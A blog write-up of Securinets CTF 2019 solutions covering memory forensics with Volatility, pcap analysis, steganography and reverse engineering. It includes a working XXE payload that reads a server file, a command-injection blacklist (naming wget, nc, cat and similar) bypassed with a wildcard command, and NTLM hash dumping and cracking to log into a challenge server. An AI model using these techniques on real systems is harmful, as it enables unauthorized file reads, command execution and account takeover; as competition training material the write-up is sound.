---
layout : default
---

# Securinets CTF 2019
25-03-2019


## Rare to win (Forensics)

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/securinetsctf/raretowin_desc.JPG)

It's a memory dump. I anaylsed it with volatility.

```
C:\Users\red\Desktop>volatility.exe -f raretowin.raw imageinfo
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (C:\Users\red\Desktop\raretowin.raw)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf800028480a0L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002849d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2019-03-23 20:47:48 UTC+0000
     Image local date and time : 2019-03-23 21:47:48 +0100
```

```
C:\Users\red\Desktop>volatility.exe -f raretowin.raw --profile=Win7SP1x64_23418 pslist
Volatility Foundation Volatility Framework 2.6
Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit
....
....
0xfffffa8001f7c630 GoogleCrashHan         1696   2772      5       93      0      0 2019-03-23 20:45:11 UTC+0000
0xfffffa8001743670 chrome.exe             2912   2756     43     1020      1      0 2019-03-23 20:45:11 UTC+0000
0xfffffa80007bdb30 chrome.exe             2744   2912      8       86      1      0 2019-03-23 20:45:11 UTC+0000
0xfffffa80024e9060 chrome.exe             2656   2912      2       58      1      0 2019-03-23 20:45:13 UTC+0000
0xfffffa8000e5e060 chrome.exe             2652   2912      9      166      1      0 2019-03-23 20:45:23 UTC+0000
0xfffffa8000e34060 chrome.exe             2972   2912     15      233      1      0 2019-03-23 20:45:37 UTC+0000
0xfffffa80025f6b30 SearchFilterHo         2772   1488      3       72      0      0 2019-03-23 20:45:56 UTC+0000
...
...
```

As the victim was browsing web, So he must be using chrome.exe

```
localhost@red:~/Desktop$ python volatility/vol.py --plugins=volatility-plugins -f raretowin.raw --profile=Win7SP1x64_23418 chromehistory
Volatility Foundation Volatility Framework 2.6.1
Index  URL                                                                              Title                                                                            Visits Typed Last Visit Time            Hidden Favicon ID
------ -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- ------ ----- -------------------------- ------ ----------
     5 https://www.google.com/search?ei=E5uWXJ.......1..gws-wiz.......33i10.1d1MmLHudn8 music macklemore & ryan lewis download - بحث Google                             1     0 2019-03-23 20:46:19.759382        N/A       
     4 https://www.google.com/search?ei=C5uWXL...-wiz.......0i7i30j0i8i7i30.o2tBk6J7PNY music macklemore & ryan lewis - بحث Google                                     1     0 2019-03-23 20:46:14.328534        N/A       
     3 https://www.google.com/search?source=hp....gws-wiz.....0..0i131j0i10.ZF1jOaSrzUQ macklemore & ryan lewis - بحث Google                                            1     0 2019-03-23 20:46:06.948223        N/A       
     2 https://www.google.com/                                                          Google                                                                                1     1 2019-03-23 20:45:46.371044        N/A       
     6 https://www.google.tn/_/chro                                                                                                                         1     1 1601-01-01 00:00:00               N/A       
     9 https://www.mediafire.com/file/2t7bb2mflg2lwwj/music.rar/file#                   music                                                                                 2     0 2019-03-23 20:47:28.109720        N/A       
     8 https://www.mediafire.com/file/2t7bb2mflg2lwwj/music.rar/file#!                  music                                                                                 2     0 2019-03-23 20:46:41.978975        N/A       
     7 https://www.mediafire.com/file/2t7bb2mflg2lwwj/music.rar/file                    music                                                                                 3     0 2019-03-23 20:46:41.978975        N/A       
     6 https://www.google.tn/_/chrome/newtab?ie=UTF-8                                                                                                                         1     1 2019-03-23 20:46:27.270709        N/A       
     1 http://www.google.com/                                                           Google                                                                                1     0 2019-03-23 20:45:46.371044        N/A       

```

See index #7, he downloaded rar file. I extracted this file with WinRAR and got this.

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/securinetsctf/music_rar.JPG)

There I saw firefox.exe which was an ELF binary. I disassembled it and there was nothing malicious in it. But it's an ELF binary named as .exe, so might this is our virus. So the full path of virus becomes "C:\Users\Public\Data\firefox.exe"

```
echo -n "C:\\Users\\Public\\Data\\firefox.exe" | md5sum
914353ebe43063302e511551e8782352
```

FLAG: securinets{914353ebe43063302e511551e8782352}

---


# Cat hunting (Forensics)

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/securinetsctf/cat_hunting_desc.JPG)

It's a memory dump. I anaylsed it with volatility.
Initial steps were same as "Rare to win". While analysis, I used chromehistory, firefoxhistory, iehistory plugins and found this with iehistory.

```
localhost@red:~/Desktop$ python volatility/vol.py --plugins=volatility-plugins -f cat_hunting --profile=Win7SP1x64_23418 iehistory
Volatility Foundation Volatility Framework 2.6.1
**************************************************
Process: 1896 explorer.exe
Cache type "URL " at 0x2705000
Record length: 0x100
Location: :2019032020190321: Noxious@file:///C:/Users/Noxious/Desktop/cat%20(6).jpg
Last modified: 2019-03-20 14:32:51 UTC+0000
Last accessed: 2019-03-20 13:32:51 UTC+0000
File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0
**************************************************
Process: 1896 explorer.exe
Cache type "URL " at 0x2705200
Record length: 0x100
Location: :2019032020190321: Noxious@file:///C:/Users/Noxious/Desktop/cat%20(10).jpg
Last modified: 2019-03-20 15:17:07 UTC+0000
Last accessed: 2019-03-20 14:17:07 UTC+0000
File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0
...
...
```

Later, I used filescan plugin and see which files are present on Desktop. I dumped two cat pictures on my local computer. Running strings on one of them reveals an ip address.

```
localhost@red:~/Desktop$ strings 1
JFIF
>http://ns.adobe.com/xap/1.0/
<?xpacket begin='
' id='W5M0MpCehiHzreSzNTczkc9d'?>
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Image::ExifTool 11.16">
        <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
                <rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">
                        <dc:creator>
                                <rdf:Seq>
                                        <rdf:li>99.80.68.141</rdf:li>
                                </rdf:Seq>
                        </dc:creator>
                </rdf:Description>
        </rdf:RDF>
</x:xmpmeta>
...
```

I visited http://99.80.68.141/ .It asks for a username and password. Then I used hashdump plugin and dumped NTLM hashes.

```
localhost@red:~/Desktop$ python volatility/vol.py -f cat_hunting --profile=Win7SP1x64_23418 hashdump
Volatility Foundation Volatility Framework 2.6.1
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Noxious:1000:aad3b435b51404eeaad3b435b51404ee:3b42a0ab2adfe15c5d657d88e77e1132:::
```

The decrypt the LM hash for Noxious user and got password #1SHOT using [this site](https://crackstation.net/). So I'm in and found [this link](http://99.80.68.141/img/cat%20(X).jpg) and downloaded the file

```
localhost@red:~/Desktop$ cat cat\ \(X\).jpg | base64 -d
securinets{d25736febfd809ec4eba76b0aae9eab0}
```

FLAG: securinets{d25736febfd809ec4eba76b0aae9eab0}

---

## Easy Trade (Forensics)

A .pcap file was provided.

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/securinetsctf/easy_trade_zip.JPG)

I got password protected zip file and password was there in one of the packets "securinetsXD"

```
localhost@red:~/Desktop/ctf/easy_trade_DONE$ xxd -r -p hex > file.zip
localhost@red:~/Desktop/ctf/easy_trade_DONE$ unzip file.zip
Archive:  file.zip
[file.zip] flag.txt password: 
 extracting: flag.txt                
localhost@red:~/Desktop/ctf/easy_trade_DONE$ cat flag.txt 
c2VjdXJpbmV0c3s5NTRmNjcwY2IyOTFlYzI3NmIxYTlmZjg0NTNlYTYwMX0
localhost@red:~/Desktop/ctf/easy_trade_DONE$ cat flag.txt | base64 -d
securinets{954f670cb291ec276b1a9ff8453ea601}base64: invalid input
```

FLAG: securinets{954f670cb291ec276b1a9ff8453ea601}

---

## Contact me (Forensics)

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/securinetsctf/contact_me_desc.JPG)

```
localhost@red:~/Desktop/ctf/contact_DONE$ echo -n securinets | base64
c2VjdXJpbmV0cw==
localhost@red:~/Desktop/ctf/contact_DONE$ strings contact_me | grep c2VjdXJpbmV
;c2VjdXJpbmV0c3szMTAxMmUxNmMzZTVkZmE3ZTY3MzYxMmQ3ZDA3NTcxNX0
;c2VjdXJpbmV0c3szMTAxMmUxNmMzZTVkZmE3ZTY3MzYxMmQ3ZDA3NTcxNX0
dard:EMailAddress=c2VjdXJpbmV0c3szMTAxMmUxNmMzZTVkZmE3ZTY3MzYxMmQ3NTcxNX0))
99A6BBB6-1B74-4A6C-AB18-EBC9B59FDD9Bc2VjdXJpbmV0c3szMTAxMmUxNmMzZTVkZmE3ZTY3MzYxMmQ3ZDA3NTcxNX0
07732B66-AC7F-496B-94BC-115B270C56AEc2VjdXJpbmV0c3szMTAxMmUxNmMzZTVkZmE3ZTY3MzYxMmQ3ZDA3NTcxNX0
D6174D25-1598-4963-9BE4-6BB56B4EB4ECc2VjdXJpbmV0c3szMTAxMmUxNmMzZTVkZmE3ZTY3MzYxMmQ3ZDA3NTcxNX0
;c2VjdXJpbmV0c3szMTAxMmUxNmMzZTVkZmE3ZTY3MzYxMmQ3ZDA3NTcxNX0
DF_L_A_g: c2VjdXJpbmV0c3szMTAxMmUxNmMzZTVkZmE3ZTY3MzYxMmQ3ZDA3NTcxNX0
DF_L_A_g: c2VjdXJpbmV0c3szMTAxMmUxNmMzZTVkZmE3ZT
?gj: c2VjdXJpbmV0c3szMTAxMmUxNmMzZTVkZmE3ZTY3MzY
^C
localhost@red:~/Desktop/ctf/contact_DONE$ echo c2VjdXJpbmV0c3szMTAxMmUxNmMzZTVkZmE3ZTY3MzYxMmQ3ZDA3NTcxNX0 | base64 -d
securinets{31012e16c3e5dfa7e673612d7d075715}base64: invalid input
```

FLAG: securinets{31012e16c3e5dfa7e673612d7d075715}

---

## Feedback (Web)

```python
import requests

payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [
<!ENTITY xxe SYSTEM "flag">
]>
<feedback>
<author>&xxe;</author>
<email>b</email>
<content>c</content>
</feedback>"""

url = "https://web2.ctfsecurinets.com/feed.php"

r = requests.post(url, data = payload)

print(r.text)

```

FLAG: Securinets{Xxe_xXE_@Ll_Th3_W@Y}

---

## Welcome (pwn)

Given description was:

Your goal is to execute welcome binary ssh welcome@51.254.114.246
password : bc09c4a0a957b3c6d8adbb47ab0419f7

```
$ ls -la
total 56
dr-xr-xr-x   2 welcome         welcome          4096 Mar 23 20:23 .
drwxr-xr-x  22 root            root             4096 Mar 24 10:18 ..
-rw-r--r--   1 root            root                0 Mar 25 11:32 .bash_history
-rw-r--r--   1 welcome         welcome             0 Mar 24 00:22 .bash_logout
-rw-r--r--   1 welcome         welcome             1 Mar 24 13:33 .bashrc
-r--------   1 welcome-cracked welcome-cracked    76 Mar 23 20:23 flag.txt
-rw-r--r--   1 welcome         welcome           655 May 16  2017 .profile
-r--------+  1 welcome-cracked welcome          8712 Mar 23 19:09 welcome
-rw-r-----   1 root            root              175 Mar 23 12:27 welcome.c
-r-s--x---   1 welcome-cracked welcome         13088 Mar 23 20:13 wrapper
-rw-r--r--   1 root            root             1741 Mar 23 20:13 wrapper.c
```

```C
// wrapper.c
#include <stdio.h>

int search(char str[], char word[])
{
    int l, i, j;
    /*length of word */
   for (l = 0; word[l] != '\0'; l++);
    for (i = 0, j = 0; str[i] != '\0' && word[j] != '\0'; i++)
    {
        if (str[i] == word[j])
        {
            j++;
        }
        else
        {
            j = 0;
        }
    }
    if (j == l)
    {
        /* substring found */
        return (i - j);
    }
    else
    {
        return  - 1;
    }
}

int delete_word(char str[], char word[], int index)
{
    int i, l;
    /* length of word */
    for (l = 0; word[l] != '\0'; l++);

    for (i = index; str[i] != '\0'; i++)
    {
        str[i] = str[i + l + 1];
    }
}

void main(int argc, char* argv[])
{
char * blacklist[]={"cat","head","less","more","cp","man","scp","xxd","dd","od","python","perl","ruby","tac","rev","xz","tar","zip","gzip","mv","flag","txt","python","perl","vi","vim","nano","pico","awk","grep","egrep","echo","find","exec","eval","regexp","tail","head","less","cut","tr","pg","du","`","$","(",")","#","bzip2","cmp","split","paste","diff","fgrep","gawk","iconv","ln","most","open","print","read","{","}","sort","uniq","tee","wget","nc","hexdump","HOSTTYPE","$","arch","env","tmp","dev","shm","lock","run","var","snap","nano","read","readlink","zcat","tailf","zcmp","zdiff","zegrep","zdiff"};
 char str[80], word[50];
    int index;
    printf("Welcome to Securinets Quals CTF \o/ \n");
    printf("Enter string:\n");
    read(0,str,79);
for (int i=0;i<sizeof(blacklist)/sizeof(blacklist[0]);i++)
{
    index = search(str, blacklist[i]);
    if (index !=  - 1)
    {
        delete_word(str, blacklist[i], index);
    }
}
setreuid(geteuid(),geteuid());
close(0);
system(str);
}

```

```
$ echo "/bin/ca* fla*" | ./wrapper
Welcome to Securinets Quals CTF o/ 
Enter string:
securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}
```

FLAG: securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}

---

## HIDDEN (misc)

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/securinetsctf/misc_1.JPG)

FLAG: Securinets{HiDDeN_D@tA_In_S3lF_S3iGnEd_CeRtifICates}

---

## EZ (misc)

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/securinetsctf/ez.JPG)

```
zsteg -E "b1,rgb,lsb,xy" pic.png > data
```

Run strings on data and read it. We have to find the DELETED_WORD from the paragraph given in "data" file. With some google search, I found [this](https://www.pagebypagebooks.com/Arthur_Conan_Doyle/Memoirs_of_Sherlock_Holmes/Adventure_XI_The_Final_Problem_p4.html)

The DELETED_WORD is memorandum-book

```
localhost@red:~/Desktop/ctf$ echo -n memorandum-book | sha1sum
b47f0d2a8866a75696f94a515d0cdf54c7ea3174  -
```

FLAG: Securinets{b47f0d2a8866a75696f94a515d0cdf54c7ea3174}

---

## Automate Me (RE)

I can easily do it with **angr**. But I did it with plain python code.

```
localhost@red:~/Desktop/ctf/automate_DONE$ objdump -d bin -M intel | grep cmp | grep "80 7d\|3c" > ins
```

 ```python
 import string

fd = open("ins")
lines = fd.readlines()
fd.close()

flag = ""

for line in lines:
	if 'cmp' in line:
		value = line.split(',')[-1]
		if 'al' in line: # assignment only
			tmp = chr(int(value,16))
                        if tmp in string.printable:
                                flag += tmp
                        else:
                                flag += ord(tmp)
		else: # xor case
			tmp = chr(int(value,16)^0xeb)
			if tmp in string.printable:
				flag += tmp
			else:
				flag += ord(tmp)

print flag
 ```
      
FLAG: securinets{automating_everything_is_the_new_future}
 
 ---
